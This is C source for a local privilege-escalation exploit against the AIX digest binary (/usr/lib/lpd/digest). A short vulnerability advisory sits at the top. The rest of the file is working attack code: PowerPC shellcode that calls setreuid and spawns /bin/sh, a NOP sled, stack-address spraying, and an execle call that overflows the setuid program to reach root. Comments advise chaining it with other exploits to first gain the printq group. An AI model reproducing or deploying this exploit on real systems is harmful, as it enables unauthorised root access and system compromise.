/*
source: https://www.securityfocus.com/bid/2033/info

AIX is a version of the UNIX Operating System distributed by IBM. A vulnerability exists in the operating system which could allow a user an elevation in priviledge.

The problem occurs in the digest binary. It is reported that it is possible to overflow a buffer in the program and overwrite a pointer to the stack, which in turn can result in an overflow in a library referenced by the binary. The secondary overflow in the library makes it possible to overwrite other stack variables, including the return address.

A malicious user could use this vulnerability to gain an elevation in priviledges, and potentially UID 0.
*/

/*## copyright LAST STAGE OF DELIRIUM dec 2000 poland        *://lsd-pl.net/ #*/
/*## /usr/lib/lpd/digest                                                     #*/

/*   note: to avoid potential system hang-up please, first obtain the exact   */
/*   AIX OS level with the use of the uname -a or oslevel commands            */

/*   printq group to root user's privilages escalation attack                 */
/*   use aix_piomkapqd or aix_piobe codes first in order to gain egid=printq  */

#define PCHNUM  2200
#define ADRNUM  8000
#define NOPNUM  8000
#define ALLIGN  2

char setreuidcode[]=
    "\x7e\x94\xa2\x79"     /* xor.    r20,r20,r20            */
    "\x40\x82\xff\xfd"     /* bnel    <setreuidcode>         */
    "\x7e\xa8\x02\xa6"     /* mflr    r21                    */
    "\x3a\xb5\x01\x40"     /* cal     r21,0x140(r21)         */
    "\x88\x55\xfe\xe0"     /* lbz     r2,-288(r21)           */
    "\x7e\x83\xa3\x78"     /* mr      r3,r20                 */
    "\x3a\xd5\xfe\xe4"     /* cal     r22,-284(r21)          */
    "\x7e\xc8\x03\xa6"     /* mtlr    r22                    */
    "\x4c\xc6\x33\x42"     /* crorc   cr6,cr6,cr6            */
    "\x44\xff\xff\x02"     /* svca                           */
    "\xff\xff\xff\xff"
    "\x38\x75\xff\x04"     /* cal     r3,-252(r21)           */
    "\x38\x95\xff\x0c"     /* cal     r4,-244(r21)           */
    "\x7e\x85\xa3\x78"     /* mr      r5,r20                 */
    "\x90\x75\xff\x0c"     /* st      r3,-244(r21)           */
    "\x92\x95\xff\x10"     /* st      r20,-240(r21)          */
    "\x88\x55\xfe\xe1"     /* lbz     r2,-287(r21)           */
    "\x9a\x95\xff\x0b"     /* stb     r20,-245(r21)          */
    "\x4b\xff\xff\xd8"     /* bl      <setreuidcode+32>      */
    "/bin/sh"
;

char nop[]="\x7f\xff\xfb\x78";

main(int argc,char **argv,char **e){
    char buffer[20000],adr[4],pch[4],*b,*envp[2];
    int i;

    printf("copyright LAST STAGE OF DELIRIUM dec 2000 poland  //lsd-pl.net/\n");
    printf("/usr/lib/lpd/digest for aix 4.1 4.2 4.3 PowerPC/POWER\n\n");

    if(argc<2){
        printf("usage: %s 41|42|43\n",argv[0]);exit(-1);
    }

    switch(atoi(argv[1])){
    case 41: memcpy(&setreuidcode[40],"\x68\x03",2); break;
    case 42: memcpy(&setreuidcode[40],"\x71\x02",2); break;
    case 43: memcpy(&setreuidcode[40],"\x82\x04",2); break;
    default: exit(-1);
    }

    i=0; while(*e++) i+=strlen(*e)+1;
    *((unsigned long*)adr)=(unsigned long)e+(i&~3)-8000-2300;
    *((unsigned long*)pch)=(unsigned long)e+(i&~3)-2300;

    envp[0]=&buffer[3000];
    envp[1]=0;

    b=buffer;
    for(i=0;i<ALLIGN;i++) *b++=' ';
    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
    *b=0;

    b=&buffer[3000];
    sprintf(b,"xxx= ");b+=5;
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(setreuidcode);i++) *b++=setreuidcode[i];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    execle("/usr/lib/lpd/digest","lsd",buffer,"lsd",0,envp);
}